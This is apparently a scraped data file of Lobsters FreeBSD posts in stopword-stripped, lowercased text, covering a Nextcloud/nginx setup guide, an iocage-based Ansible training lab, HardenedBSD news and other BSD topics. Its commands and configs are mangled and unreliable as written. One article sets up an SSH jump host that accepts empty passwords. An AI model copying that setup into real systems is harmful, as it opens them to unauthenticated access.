xpermittedcrossdomainpolicies none path root installation root usrlocalwwwnextcloud location robotstxt allow lognotfound accesslog location wellknowncarddav return scheme hostremotephpdav location wellknowncaldav return scheme hostremotephpdav buffer timeouts upload size clientmaxbodysize clientbodybuffersize sendtimeout enable gzip remove etag header gzip gzipvary gzipcomplevel gzipminlength gzipproxied expired nocache nostore private nolastmodified noetag auth gziptypes applicationatomxml applicationjavascript applicationjson applicationldjson applicationmanifestjson applicationrssxml applicationvndgeojson applicationvndmsfontobject applicationxfontttf applicationxwebappmanifestjson applicationxhtmlxml applicationxml fontopentype imagebmp imagesvgxml imagexicon textcachemanifest textcss textplain textvcard textvndrimlocationxloc textvtt textxcomponent textxcrossdomainpolicy location rewrite indexphp requesturi location deny location autotestoccissueindiedbconsole deny location indexremotepubliccroncoreajaxupdatestatusocsv updateroc m provider php fastcgisplitpathinfo php include fastcgiparams fastcgiparam scriptfilename documentroot fastcgiscriptname fastcgiparam pathinfo fastcgipathinfo fastcgiparam http fastcgiparam modheadersavailable true fastcgiparam frontcontrolleractive true fastcgipass phphandler fastcgiintercepterrors fastcgirequestbuffering fastcgikeepconn fastcgibuffers fastcgibuffersize fastcgibusybufferssize fastcgitempfilewritesize fastcgisendtimeout fastcgireadtimeout fastcgiconnecttimeout location updateroc m provider tryfiles uri index indexphp adding cache control header j cs file make sure php block location svggif tryfiles uri indexphp uri isargs args addheader cachecontrol public header security related intended duplicated one addheader stricttransportsecurity includesubdomains preload header addheader xcontenttypeoptions nosniff addheader xxssprotection modeblock addheader xrobotstag none addheader xdownloadoptions noopen addheader xpermittedcrossdomainpolicies none optional dont log access asset accesslog location pnghtmlttficojpgjpeg tryfiles uri indexphp uri isargs args optional dont log access asset accesslog openssl http certificate generate certificate needed http service nextcloud mkdir p usrlocaletcnginxssl cd usrlocaletcnginxssl openssl genrsa serverkey generating rsa private key bit long modulus prime e enter pas phrase serverkey serverkeypassword verifying enter pas phrase serverkey serverkeypassword usual use something sensible serverkeypassword string openssl req new key serverkey servercsr enter pas phrase serverkey asked enter information incorporated certificate request enter called distinguished name dn quite field leave blank field default value enter field left blank country name letter code au pl state province name full name somestate lodzkie locality name eg city lodz organization name eg company internet widgits pty ltd vermaden enterprise ltd organizational unit name eg section department common name eg server fqdn name nextclouddomaincom email address vermaden interiapl please enter following extra attribute sent certificate request challenge password optional company name cp serverkey serverkeyorig openssl rsa serverkeyorig serverkey enter pas phrase serverkeyorig serverkeypassword writing rsa key l l usrlocaletcnginxssl total rwr r root wheel servercsr rw root wheel serverkey rw root wheel serverkeyorig openssl req day servercsr signkey serverkey servercrt signature ok subjectc pl st lodzkie l lodz vermaden enterprise ltd ou department cn nextclouddomaincom emailaddress vermaden interiapl getting private key ln usrlocaletcnginxsslservercrt usrlocaletcnginxsslsslbundlecrt php used php configuration file nextcloud grep usrlocaletcphpini php engine shortopentag precision outputbuffering zliboutputcompression implicitflush unserializecallbackfunc serializeprecision disablefunctions disableclasses zendenablegc exposephp maxexecutiontime maxinputtime memorylimit errorreporting eall edeprecated estrict displayerrors displaystartuperrors logerrors logerrorsmaxlen ignorerepeatederrors ignorerepeatedsource reportmemleaks trackerrors htmlerrors errorlog varlogphplog variablesorder gpcs requestorder gp registerargcargv autoglobalsjit postmaxsize autoprependfile autoappendfile defaultmimetype texthtml defaultcharset docroot userdir enabledl fileuploads uploadmaxfilesize maxfileuploads allowurlfopen allowurlinclude defaultsockettimeout cli server cliservercolor date datetimezone europewarsaw filter iconv intl pcre pdo pdomysql pdomysqlcachesize pdomysqldefaultsocket phar mail function smtp localhost smtpport mailaddxheader sql sqlsafemode odbc odbcallowpersistent odbccheckpersistent odbcmaxpersistent odbcmaxlinks odbcdefaultlrl odbcdefaultbinmode interbase ibaseallowpersistent ibasemaxpersistent ibasemaxlinks ibasetimestampformat h ibasedateformat ibasetimeformat h mysqli mysqlimaxpersistent mysqliallowpersistent mysqlimaxlinks mysqlicachesize mysqlidefaultport mysqlidefaultsocket mysqlidefaulthost mysqlidefaultuser mysqlidefaultpw mysqlireconnect mysqlnd mysqlndcollectstatistics mysqlndcollectmemorystatistics postgresql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice bcmath bcmathscale browscap session sessionsavehandler file sessionsavepath tmp sessionusestrictmode sessionusecookies sessionuseonlycookies sessionname phpsessid sessionautostart sessioncookielifetime sessioncookiepath sessioncookiedomain sessioncookiehttponly sessionserializehandler php sessiongcprobability sessiongcdivisor sessiongcmaxlifetime sessionreferercheck sessioncachelimiter nocache sessioncacheexpire sessionusetranssid sessionhashfunction sessionhashbitspercharacter urlrewritertags ahref areahref framesrc inputsrc formfakeentry assertion zendassertions com mbstring gd exif tidy tidycleanoutput soap soapwsdlcachedir tmp soapwsdlcachelimit sysvshm ldap ldapmaxlinks mcrypt dba opcache curl openssl php postgresql database setting needed make php work postgresql database cat extensionpgsqlso cat postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof cat extensionpgsqlso postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice second one cat extensionpdopgsqlso cat postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof cat extensionpdopgsqlso postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice php fpm php fpm daemon grep usrlocaletcphpfpmconf global pid runphpfpmpid errorlog logphpfpmlog syslogfacility daemon includeusrlocaletcphpfpmd conf touch varlogphpfpmlog chown www www varlogphpfpmlog grep usrlocaletcphpfpmdwwwconf www user www group www listen listenbacklog listenowner www listengroup www listenmode listenallowedclients pm static pmmaxchildren pmstartservers pmminspareservers pmmaxspareservers pmprocessidletimeout pmmaxrequests requestterminatetimeout rlimitfiles env hostname hostname env path usrlocalbin usrbin bin env tmp tmp env tmpdir tmp env temp tmp start backend service start backend service needed nextcloud service postgresql start cet log starting postgresql compiled freebsd clang version based llvm cet log listening address port cet log listening address port cet log listening unix socket cet log ending log output stderr cet hint future log output go log destination syslog service postgresql status pgctl server running pid usrlocalbinpostgres service phpfpm start performing sanity check phpfpm configuration notice configuration file usrlocaletcphpfpmconf test successful starting phpfpm service phpfpm status phpfpm running pid service memcached start starting memcached service memcached status memcached running pid service nginx start performing sanity check nginx configuration nginx configuration file usrlocaletcnginxnginxconf syntax ok nginx configuration file usrlocaletcnginxnginxconf test successful starting nginx nextcloud configuration created link named data nextcloud data directory located usrlocalwwwnextclouddata place ln usrlocalwwwnextclouddata data use firefox web browser finish nextcloud configuration type http browser nextcloud instance ip address sorry following image polish language forgot change english assume put field context finish setup go straight nextcloud overview page http page see else need taken care two issue need addressed one nginx configuration postgresql let fix add needed header nginx configuration file diff u usrlocaletcnginxnginxconfold usrlocaletcnginxnginxconf usrlocaletcnginxnginxconfold usrlocaletcnginxnginxconf addheader xrobotstag none addheader xdownloadoptions noopen addheader xpermittedcrossdomainpolicies none addheader xframeoptions sameorigin path root installation root usrlocalwwwnextcloud service nginx reload performing sanity check nginx configuration nginx configuration file usrlocaletcnginxnginxconf syntax ok nginx configuration file usrlocaletcnginxnginxconf test successful update postgresql convertion sudo u www usrlocalbinphp usrlocalwwwnextcloudocc db convertfilecachebigint following column updated mountsstorageid mountsrootid mountsmountid take hour depending number file instance continue conversion yn n viola problem gone trusted domain enter nextcloud using different domain get warning add new trusted domain nextcloud config following look change grep trusted usrlocalwwwnextcloudconfigconfigphp trusteddomains array add nextclouddomaincom domain vi usrlocalwwwnextcloudconfigconfigphp grep trusted usrlocalwwwnextcloudconfigconfigphp trusteddomains array nextclouddomaincom course add successive number grep trusted usrlocalwwwnextcloudconfigconfigphp trusteddomains array nextclouddomaincom clouddomaincom end guide feel free share thougths log rotation newsyslog newsyslog part freebsd base system add nextcloud backend daemon log file newsyslog configuration rotated cat etcnewsyslogconf datanextcloudlog www www jc usrlocalwwwnextclouddatanextcloudlog www www jc varlogphpfpmlog www www jc varlognginxerrorlog www www jc varlognginxaccesslog www www jc eof run free space log grow time eof like like loading related
187,Lobsters,freebsd,FreeBSD,Happy Holidays From HardenedBSD,https://hardenedbsd.org/article/shawn-webb/2019-12-24/happy-holidays-hardenedbsd,happy holiday hardenedbsd,http,hardenedbsd would like wish community happy end joyful beginning today finished putting piece place migrate away github hardenedbsd build infrastructure fully selfhosted plan make repos github readonly end january still maintain presence github repos still live github however readonly mirror selfhosted sourceoftruth repository going forward please file bug report pull request gitea server http likely make appealing subdomain perhaps githardenedbsdorg later keep everyone updated ifwhen update site accordingly soon happy holiday hope community enjoys little endofyear gift
188,Lobsters,freebsd,FreeBSD,NomadBSD - Installation and First Impressions,https://www.youtube.com/watch?v=7DglP7SbnlA,nomadbsd installation first impression,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature nomadbsd installation first impression youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature nomadbsd installation first impression youtube
189,Lobsters,freebsd,FreeBSD,Building Ansible Training Environment on FreeBSD,https://jpmens.net/2019/12/11/on-building-an-ansible-training-environment-on-freebsd/,building ansible training environment freebsd,ansible pieter discus systemdnspawn loadays btrfs ansible revisiting bsd visited bsdcan eurobsdcon year comparative introduction freebsd linux user installed openbsd laptop mischa openbsdamsterdam freebsd zfs nomadbsd week jail title talk freebsd jail jail ezjail bastillebsd iocage lucas jail book iocage documentation glance two iocage source iocage bastillebsd template bootstrap shell script add jail address pf delivering package dan iocage make poudriere ansible installs ansible naming thing certain said tony got list year ago yaml unbound domain name stuff figlet unbound enough resource simple playbook bind getting user logged iocage putty mobaxterm mobaxterm putty sock freebsd documentation loginconf,course last three year pleasure lot teaching really mostly pleasure take teaching seriously invest quite bit energy bring love particular topic across strenuous nay exhausting time worth course prepare system environment student get run lab aka practical exercise create run ansible playbook ansible training install dns server dns training past used virtualbox create lab environment run multiple platform preconfigured vms specific capability eg ansible vm contains dhcp dns package repo pip repo git server etc created small shell script unpacks virtualbox appliance ovum file number vms student use data center love saying think bit data center teeny tiny one four vms onto deployment developed nothing fancy many student need bit effort understanding going give training customer site client say unixlinux workstation yes know ansible requires unix want training window pc shell script installer practicably ansible point becomes useless individual step need typed manually could turn bat file whatever motivation low knowing would change whole setup sometime virtualbox served u well past slow bit brittle linux closing lid laptop often cause breakage next morning strangely happens neither window macos far able ascertain particular cumbersome update anything data center bring vms change whatever requires changing package vms ovum copy onto thumb drive andor make available downloading high time change envision laptop take customer site power plug switch go user login time start lab experience troublefree ansible environment laptop software must easy update particular ansible installation must easily exchanged newer version training however also require possibility fall back prior version something go awry built environment dns training using fedora linux systemdnspawn hearing pieter discus systemdnspawn loadays system based btrfs worked well still recall amused pitfall ran overcame plan redo based work present hope demonstrate following diagram depicts intend describe individual bit interact controller ansible controller machine trainee login order develop run playbook give choice editor standard unix editor via joe pine pico mg vi vim student create system requires three machine data center little box right hand side student three revisiting bsd mostly ignored thing bsd last dozen year visited bsdcan eurobsdcon year became enamored clean simplicity saw balanced comparative introduction freebsd linux user recommend read want get mood earlier year installed openbsd laptop able replace mac close second considered using openbsd vmmvmd experiment promising mischa run openbsdamsterdam successfully one idea led next decided give freebsd closer look particular jail zfs oh forget mention want really sexylooking graphical ui freebsd head nomadbsd gave whirl look gorgeous read moment require need graphical workstation project would install nomadbsd week jail apology michael lucas stealing bit title talk suspected freebsd jail would well suited project jail virtualization access file system user process networking student require platform onto ssh via ansible install package deploy template create user etc jail started bit lowlevel first jail ezjail quickly found bastillebsd liked lot got stuck networking tried iocage remained record show stuck networking bastillebsd fault mine combination lucas jail book iocage documentation glance two iocage source got going main reason choosing iocage bastillebsd jail creation iocage template allow build base jail containing need fire creation jail based template bastillebsd also templating bit like automation applied jail launched practical purpose iocage template faster ansible training template created follows initial bootstrap shell script host iocage create r n host cp ansibootstrapsh host iocage start mach tmpansibootstrapsh mach exit host iocage stop host iocage set templateyes note template ansible student machine completes building template take minute two order build three jail student run mkansijailssh shell script generated ansible template see iocage create n note ansible xx resolver domain xxexample nameserver apropos stuck networking happened iocage well found incorrectly add jail address pf delivering package setting ansible template jail well providing package repository student install something lab work need freebsd package repository wanted keep simple possible recall laptop used conduct training session afford cut corner term security end session reset jail dan taught make jail system jail package repository lovingly called dhl service delivers package ok sorry set booton iocage start dhl basically run nginxlite service autoindex build package repository proper makefile think recently confessed love make one unix hidden gem list screen sudo tmux bash wget curl bindtools moreutils assumealwaysyesyes pkg fetch u output list pkg repo fetch obtains package dependency repo creates repository need within repository directory ensure symbolic link pkgtxz latest version machine bootstrap package system training jail built iocage template use dhl repository server package configuration installed disable freebsd repository add really like way implemented need muck freebsd provided configuration etcpkg simply add new file usrlocaletcpkg therein disable freebsd standard repository freebsd enabled dhl url http enabled yes signaturetype none copying package way likely simplistic freebsd folk run poudriere building package would overkill lightweight copy package dependency requiring lab simple sufficient ansible installs ansible student login account ansible controller irrespective whether run host dedicated jail set dedicated login class ansible nologinvarrunansibleno pathbin bin usrbin usrlocalbin usrlocalansiblelatestbin hushlogin tcstandard permit u different ansible installation use path symbolic link called latest point student current version l l usrlocalansible drwxrxrx root wheel dec drwxrxrx root wheel dec drwxrxrx root wheel dec lrwxrxrx root wheel dec latest version get well distribute ansible ansible course var adir usrlocalansible aver task name ansible install ansible pip new virtualenv pip name ansible aver virtualenv adir aver virtualenvcommand venv name ansible symlink current version latest file src adir aver dest adir latest state link force true naming thing student shall subdomain lab instructs create playbook deploy onto host web use short name point specific web server jail one diagram know naming thing difficult bit fun asking twitter spent better part hour grinning manner suggestion course taken note certain people said one least useless good idea element periodic table took step chose matched cctld name turn tony got list year ago result became small yaml database yeah knew like hostnames app mosq web domain code al elem aluminium cc albania code elem arsenic cc american samoa code au elem aurum cc australia use data base within ansible template creating unbound dns local data rule pf firewall creating user al au ansible controller templating mkansijailssh script creates student jail ansiblemanaged shell script generated set n namespace counter n domain h hostnames set nnn format nscounter nsn set ip format nscounter nsn iocage create n nnn note ansible dcodelower resolver domain dcodeupper example nameserver ip set nsn nsn endfor set nscounter nscounter skip next block set nsn endfor domain name stuff student jail created resolver configuration set domain within jail host iocage create resolver domain xxexample nameserver iocage us resolver setting replacing semicolon newlines install etcresolvconf file jail started student jail therewith access domain shell account template profile set localdomain value eg xxexample student us ansible ssh www say get response query wwwxxexample localdomain make lot sense set domain resolver configuration also use figlet one unix important utility welcome user login host jail point resolver unbound configured local data txt record bound forget twoletter code mean template domainsyml ansible managed server localdata appalexample localdata appalexample txt element aluminium localdata appalexample txt cc albania localdataptr appalexample come incoming pf port redirections lab web server rdr pas inet proto tcp port port al aluminium rdr pas inet proto tcp port port arsenic rdr pas inet proto tcp port port au aurum domainsyml database also used template mkansijailssh shell script create student iocage jail seen earlier lastly create directory user etc ansible controller jail name create profile copy content export localdomain itemcodeupper example figlet localdomain dest homeprefix itemcodelower profile owner itemcodelower mode withitems domain get picture enough resource training laptop thinkpad running freebsd ram starting asked around whether people thought sort hardware would manage jail python response yeah probably depends course number come participant machine data center yet ansible training laptop production pessimistic careful type simulated load putting much pressure system expect created jail five time amount need could likely done many following output almost idle running jail last pid load average process running sleeping cpu user nice system interrupt idle mem active inact wired free arc total mfu mru anon header compressed uncompressed ratio swap total free whipped simple playbook install package launch nginx bind name server jail using ten fork total runtime time host ie laptop remained responsive known process running noticed instant playbook finished system looked like last pid load average running sleeping cpu user nice system interrupt idle mem active inact laundry wired free arc total mfu mru anon header compressed uncompressed ratio swap total free minute two jail still running copy bind nginx load average fell decided spice thing bit fired creation cron entry would execute minute machine via ansible ansible keygenerate rm f tmpxxx sshkeygen rsa b n bla f tmpxxx ran playbook batch second batch happened last pid load average running sleeping stopped zombie cpu user nice system interrupt idle mem active inact laundry wired free arc total mfu mru anon header compressed uncompressed ratio swap total free machine became wee sluggish put mildly honest unusable one thing left iocage destroy slow killed jail quickly jail r jls grep awk print removed jail iocage destroy f iocage list h awk substr print running ssh key generation many parallel jail environment built curious apart experiment say working machine proper notice performance issue expect trouble getting user logged originally envisioned vnet jail onto trainee would login think trouble worth one get dhcp working vnet iocage likely something missing pf hand use static ip machine must connect whichever network visiting training laptop unix unix multi user system first decided let user login host require neither root permission special privilege text editor able run ansible ssh much student kaputt hand hear dan saying one jail per service jail shared private ip space could configure pf redirect different port ansible controller jail hear lucas guy yell lead telling user thing like add port number find service jail yes also must consider user window running putty mobaxterm similar got following option create training user host proper create controller jail user ssh client jump user ansible configuration would identical case create required via ansible domainsyml data base second case requires bit additional work requires special configuration client side easily create ssh jump host configuration sshdconfig host host echo training pw useradd n detour c ssh jump bincsh h w none host tail etcsshsshdconfig match user detour allowagentforwarding allowtcpforwarding yes permittunnel gatewayports pubkeyauthentication permitemptypasswords yes passwordauthentication yes forcecommand echo account proxyjump handle new old version jumping via bastion host disadvantage specify two password one jump host target jail student basically day think minor inconvenience ssh j detour l xx ssh proxycommand ssh w h p detour l xx minor inconvenience overcome creating user w none shown adding nullok end line auth required pamunixso etcpamdsshd restarting sshd jump host prompt password user please tell anybody told configuration also work well mobaxterm venerable putty support jump host sock rescue form grep etcrcconf yes b u root cat set auth n permit configure putty use proxy port see connection log grep utc connect started utc connect terminated could even use sock proxy get firefox speak user lab jail decided whether student jump ansible controller jail whether make life easier populate host proper tend former resetting easier end training latter would comfortable student would gladly yes working freebsd rewarding documentation good software solid everything make polished impression problem packaged program bit older get port neither record fact special console driver automatically detected much appreciate initially look almost primitive eg rcconf fact inspiring simplicity example upon reading manual loginconf appreciate well thoughtout integration system particular read actually function way mentioned earlier overwriting standard freebsd package repository dropping file invalidates separate directory make sense make lot thing easier one example part bsd operating system well thought lucas h said recently software long term feel past year work least three distinct linux distribution customer site particular order centos debian differing version suse linux sle also different version lost count many different location try order configure networking set dns resolution inilooking file etcnetworks etcsysconfigsomething oh right yaml networkmanager fear next version something rip replace yet another system sure plenty know muscle memory thirtytween distribution never add simply want also much important lost count number time able find need documentation bundled linux distro du jour instead googled often incorrect answer bsds may somewhat oldfashioned compared newest whizbang linux distro suit also
190,Lobsters,freebsd,FreeBSD,BSDCan 2020 call for papers,https://lists.bsdcan.org/pipermail/bsdcan-announce/2019-December/000180.html,bsdcan call paper,bsdcanannounce bsdcan call paper dan langilleorg http http http dan langilleorg information bsdcanannounce mailing list,bsdcanannounce bsdcan call paper dan langille dan langilleorg thu dec utc bsdcan held frisat june ottawa university ottawa preceded two day tutorial june wedthu note change month back june also miss goat bof tuesday june accepting proposal talk talk designed strong technical content bias proposal business development marketing nature appropriate venue see http something interesting bsd operating system please submit proposal whether developing complex system using bsd foundation helping others story tell bsd played role want hear experience people using bsd platform research also encouraged submit proposal possible topic include manage giant installation respect handling spam andor sysadmin andor networking cool new stuff bsd tell u project run bsd topic see next paragraph bsdcan website archive section allow review wide variety past bsdcan presentation example user developer encouraged share experience schedule dec proposal acceptance begin sorry day late jan proposal acceptance end feb confirmation accepted proposal see also http instruction submitting proposal bsdcan available http dan langille dan langilleorg information bsdcanannounce mailing list
191,Lobsters,freebsd,FreeBSD,December 2019 HardenedBSD Infrastructure Status,https://hardenedbsd.org/article/shawn-webb/2019-12-11/december-2019-infrastructure-status,december hardenedbsd infrastructure status,http http githubcomhardenedbsdbuildissues,thought take moment update community stand infrastructure infrastructure received first community contribution last week completed deployed pull request http earlier today deployed letsencrypt primary mirror last piece puzzle set rsync mirror reenable syncing u probably tackle january taking small break little bit especially holiday love infrastructure work want contribute take look open issue http githubcomhardenedbsdbuildissues always itch scratch nt wait feel itch submit patch proactively help scratch itch next major focus package build
192,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 19 - Configuration - Plank - Skippy-XD,https://vermaden.wordpress.com/2019/12/10/freebsd-desktop-part-19-configuration-plank-skippy-xd/,freebsd desktop part configuration plank skippyxd,mac o x macos dock mac o x macos expose freebsd desktop global page plank skippyxd like,long time see article freebsd desktop series add plank skippyxd existing setup share plank configuration along theme fit rest setup plank open implementation idea brought life mac o x macos dock also add skippyxd tool implement mac o x macos expose idea one ask use plank already similar purpose support autohide prefer see time get basicfast idea launched desktop plank hidden hurt sometimes help mac o x macos dock expose action may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content install plank skippyxd freebsd use default package shown pkg install skippyxd plank plank plank dock composes rest setup plank dock come graphical preference window needed need launch command line plank preference command used plank theme kept localshareplankthemesvermadendocktheme file grep localshareplankthemesvermadendocktheme planktheme plankdocktheme cascadehidetrue plankdrawingdocktheme cascadehidetrue mine plank dock setting kept file grep plankdockpreferences currentworkspaceonlyfalse dockitemscajadockitem leafpaddockitem firefoxdockitem geanydockitem thunderbirddockitem galculatordockitem deadbeefdockitem transmissiongtkdockitem pidgindockitem themevermaden lockitemsfalse pressurerevealfalse pinnedonlyfalse autopinningtrue showdockitemtrue zoomenabledfalse skippyxd may wonder xd skippy name skippy started pure software solution unfortunately quite slow especially time skippy introduced decade ago skippy developer rewrote use new xdamage module change skippy started work almost instantly marked name remains date skippyxd skippyxd look like skippyxd needsupport theme configuration file located configskippyxdskippyxdrc place grep configskippyxdskippyxdrc general distance usenetwmfullscreen true ignoreskiptaskbar true updatefreq lazytrans true pipepath tmpskippyxdfifo movepointeronstart true movepointeronselect true movepointeronraise true switchdesktoponactivate true usenamewindowpixmap false forcenamewindowpixmap false includeframe true allowupscale true showalldesktops true showunmapped true preferrediconsize clientdisplaymodes thumbnail icon filled none iconfillspec orig mid mid fillspec orig mid mid ffffff background xinerama showall true normal tint black tintopacity opacity highlight tint tintopacity opacity tooltip show true followsmouse true offsetx offsety align left border background opacity text eedddd textshadow none font weightnormal binding focus closeewmh iconify one nice feature skippyxd configure per desktop globally per currently existing virtual desktop also prefer display window thumbnail window exist current desktop course change behavior skippyxd config file eof like like loading related
194,Lobsters,freebsd,FreeBSD,HardenedBSD Infrastructure Goals,https://github.com/lattera/articles/blob/master/hardenedbsd/2019-12-01_infrastructure/article.md,hardenedbsd infrastructure goal,hardenedbsd infrastructure goal,hardenedbsd infrastructure goal extremely productive year regard hardenedbsd infrastructure several opportunity aligned way open door nearcomplete rebuild vast expansion last month especially seen major expansion infrastructure obtained number toberetired dell server crash nightly build server provided opportunity deploy server doubling build capacity available time spend hardenedbsd decreased compared time last year part rebuilding infrastructure wanted enable community able contribute structuring work help pull request away hardenedbsd community want contribute infrastructure work simply open pull request review code deploy successful review userscontributors nt need access server order improve primary goal rest become fully selfhosted sole exception email want transition sourceoftruth git repos infrastructure still provide readonly mirror github develop infrastructure human right mind hardenedbsd unique position plan provide production tor onion service various bit infrastructure hardenedbsd provide access various internal service developer contributor entire development lifecycle going dev prod able happen tor transparency key moving forward log autosync script published directly github build log soon log automated process code process tracked publicly via git especially crucial development tor integrating tor infrastructure deeply increase risk maintenance burden however believe added transparency able mitigate risk periodic audit need performed published hope migrate hardenedbsd site away drupal static site generator nt really need dynamic capability drupal give u many security issue drupal php bring also leave much desired spent last month laying foundation successful excited see project grows
195,Lobsters,freebsd,FreeBSD,Some notes on userspace routing,http://daemonology.net/blog/2019-11-27-Some-notes-on-userspace-routing.html,note userspace routing,note userspace routing earlier blog post amazon documentation redirecting traffic getting packet next aws invent view forum thread blog comment powered,note userspace routing reason immediately apparent anyone read earlier blog post instance metadata service use iam role recently decided wanted intercept outgoing ip packet destination case want redirect block case want proceed unimpeded make thing harder two constraint nt want write new kernel code since venturing kernel introduces much wider range potential adverse outcome code buggy nt want make use firewall since user might firewall rulesets could conflict imdsfiltering rule also traversing firewall even one trivial ruleset cost become nontrivial sort highbandwith application freebsd excels reason le enthusiastic suggestion amazon documentation user consider using local firewall rule restrict access instance metadata service like consider experienced freebsd developer networking area expertise spent significant amount time flailing wildly reading often wildlyoutofdate documentation trying figure hope helping next person want something like note worked nt redirecting traffic want outgoing network traffic land daemon choice rather passing external network interface first thought redirect traffic freebsd jail virtualized network stack stack could use network address translation rewrite packet send traffic daemon bound convenient ip address say get traffic jail though immediately obvious answer use epair pair network interface connected virtual network cable nt realize far long since epair pair ethernet interface behaves like ethernet layer connection layer connection ca nt simply say route ip packet connection instead need say route ip packet via gateway connection could work decided unnecessarily complicated instead solution opted create tun device layer endpoint ip packet routed easily read process open device node question since wanted inspect packet userland provided simple solution drop packet rewrite packet eg change destination ip inject back system writing tun device getting packet harder problem turned one nt even considered outgoing packet redirected allow packet say instance metadata service request come root get rather simply coming right back first thought outgoing request made inside aforementioned vnet jail indeed amazon took sensible approach separating control data network interface would worked well could placed control interface vnet jail could easily segregated potentially vulnerable code ala amazon expose instance metadata service via network interface regular ip traffic us making request service fictitious ip address eg nt work since default filter outgoing packet using source ip address default get one ip address ca nt make request others second attempt take packet via tun interface forward external interface using sodontroute socket option effectively bypassing routing rule redirecting packet destination unfortunately freebsd implementation raw socket nt respect sodontroute determines appropriate output interface packet based destination ip address regardless instruction contrary third thought send packet inside vnet jail order bypass routing rule set host bridge tap interface jail instance external interface able send packet interface right source ip address ran another problem namely also filter ethernet segment based source mac address attempt number four thing set mac address jailed tap interface match external interface order segment pas filtering stumped long time eventually figured nt working bridge two interface freebsd forward ethernet segment based interface segment entered bridge rather based segment source mac address ca nt forge outgoing segment via bridge fifth thought took back using raw socket rather trying use sodontroute ip packet could use raw socket write ethernet segment shortlived hope operating system support sockraw pflink freebsd ca nt use raw socket send ethernet segment finally sixth attempt figured right way bpf best known mechanism reading packet network also used write packet effect bpf provides write raw ethernet segment network interface support freebsd nt implement sockraw next code intercept outgoing connection instance metadata service forward packet vnet jail forward packet external interface rest straightforward write daemon handle intercepted connection decide packet go direction luck something ready demonstrate aws invent interested look view forum thread blog comment powered
196,Lobsters,freebsd,FreeBSD,2019Q3 FreeBSD Quarterly Status Report,https://www.freebsd.org/news/status/report-2019-07-2019-09.html,freebsd quarterly status report,introduction administration page clusteradm freebsdorg jenkinsadmin freebsdorg lwhsu freebsdorg devsummit core freebsdorg deb freebsdfoundationorg making donation wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram devsummit freebsdtesting archive roller angel event attended upcoming event shopfreebsd freebsdorg zeising freebsdorg http gitterimfreebsddesktoplobby http githubcomfreebsddesktop freebsdorg secteam freebsdorg emaste freebsdorg rebased updated committed asomers freebsdorg buggy socadmins freebsdorg shivank freebsdorg bz freebsdorg emaste freebsdorg rmacklem freebsdorg ganbold freebsdorg andrew freebsdorg markj freebsdorg tuexen freebsdorg sbahra freebsdorg scottph freebsdorg kib freebsdorg markj freebsdorg delphij freebsdorg ota jemailnejp brook freebsdorg kib freebsdorg kib freebsdorg mst semihalfcom mindal semihalfcom mw semihalfcom broadcom soc series rwatson freebsdorg andrew freebsdorg brook freebsdorg arm blog light blue touchpaper blog cheri website cheriabi linimon freebsdorg jhibbits freebsdorg pkubaj freebsdorg nyi mw semihalfcom ar semihalfcom nxp soc emaste freebsdorg patch expruns committed dvl freebsdorg approach commit hook python library glewis freebsdorg kde freebsdorg http kdenliveorg open bug list copy port repository portmgrsecretary freebsdorg portmgr freebsdorg xfce freebsdorg olevole olevoleru clonos clonoscbsd status report update clonos package clonos package repo mk semihalfcom mba semihalfcom mw semihalfcom pizzamig freebsdorg estebanbarrios trivagocom alfonsosiciliano emailcom news home status home,introductionhere third quarterly status report quarter report team active usual thanks better organization call report reminder sent regularly report reviewed merged quickly would like thank debdrup particular reviewing work efficiency could still improved help community particular quarterly team found many report arrived last day deadline even would like invite community follow guideline help u sending report sooner send first draft report receive first call report month deadline update report needed receive reminder normaly receive two week week deadline deadline still update ask team either irc via freebsdwiki send email monthly wait feel urgent otherwise start putting draft next quarterstarting next quarter quarterly status report prepared last month quarter instead first month quarter end mean deadline submitting report january april july octobernext quarter short one covering month november december report probably mid january lorenzo salvadoreentries various official semiofficial team found administration page contact cluster administration team clusteradm freebsdorg freebsd cluster administration team consists people responsible administering machine project relies distributed work communication synchronised quarter team worked following change address twn site solved hardware issue kwc site hr moved remaining infrastructure ysv yahoo site nyi new york internet peter ysv hosted freebsdorg installed new machine portmgr courtesy freebsd foundation resolved outtages thanks uqs github exporter bugzilla hgbeta thanks bapt server online building pkgs reference host ongoing system administration work creating account new committers backup critical infrastructure keeping security update party software work progress review service jail service administrator operation south africa mirror jinx progress nvme issue blocking dual socket machine used pkg builder drive upgrade test pkg builder ssds courtesy freebsd foundation boot issue reference machine new nyinet sponsored colocation space chicagoland area setup new host ci staging environment contact jenkins admin jenkinsadmin freebsdorg contact liwen hsu lwhsu freebsdorg freebsd ci team maintains continuous integration system related task freebsd project ci system regularly check committed change successfully built performs various test analysis result result build job archived artifact server testing debugging need ci team member examine failing build unstable test work expert area fix code adjust test infrastructure detail effort available weekly ci report testing working group devsummit lwhsu presented testingci project status work freebsd ci system slide available devsummit page content migrated http wikifreebsdorgjenkinsdebug extending welcomed continue publishing ci weekly report moved archive http hackmdio freebsdci work progress collecting sorting ci task idea http setup ci stage environment put experimental job extending publishing embedded board testbed implementing automatic test bare metal hardware adding drm port building test current testing merging pull request http githubcomfreebsdfreebsdcipulls planning running ztest network stack test help software get ci freebsd hosted ci solution please see freebsdtesting related ticket wip information project sponsored freebsd foundation contact freebsd core team core freebsdorg freebsd core team governing body freebsd core provisionally accepted bsdpatent license use case core team must approve import new bsdpatent licensed component change license existing component bsdpatent license http opensourceorglicensesbsdpluspatent kernel pseudo random number generator prng maintainership updated reduce contribution barrier committers demonstrated competence part tree core approved source commit bit paweł biernacki konstantin belousov kib mentor paweł mateusz guzik mjg comentor coreinitiated git transition working group met last quarter however report still forthcoming discussion continue fourth quarter many issue resolve including deal contrib whether regenerate hash current git repository best implement commit testing contact deb goodkin 